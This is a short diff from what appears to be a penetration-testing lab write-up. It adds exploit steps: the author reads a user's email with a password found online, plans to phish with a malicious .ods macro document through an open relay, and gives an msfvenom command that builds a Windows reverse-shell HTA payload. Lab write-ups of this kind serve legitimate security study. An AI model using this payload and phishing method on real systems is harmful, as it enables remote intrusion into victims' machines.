@@ -184,11 +184,16 @@ Anonymous login successful
 
 1. Exploit Steps
 
+- After finding user Jonas password on the company website, I was able to read his emails. It looks like organization allows and expects  .ods files. Decided to create a malicous .ods and send via the open relay. 
+
+- Created payload using msfvenom.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f hta-psh -o evil.hta
 ```
 
+- Split the payload so I can easily put in macro.
 
-
-```
 
 2. Shell Access
 
